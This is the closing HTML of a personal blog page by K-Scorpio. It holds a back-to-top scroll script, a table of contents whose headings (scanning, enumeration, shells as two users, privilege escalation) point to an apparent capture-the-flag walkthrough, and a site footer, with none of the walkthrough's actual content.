<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#shell-as-mikasaackerman>Shell as mikasaackerman</a></li><li><a href=#shell-as-lorra199>Shell as lorra199</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>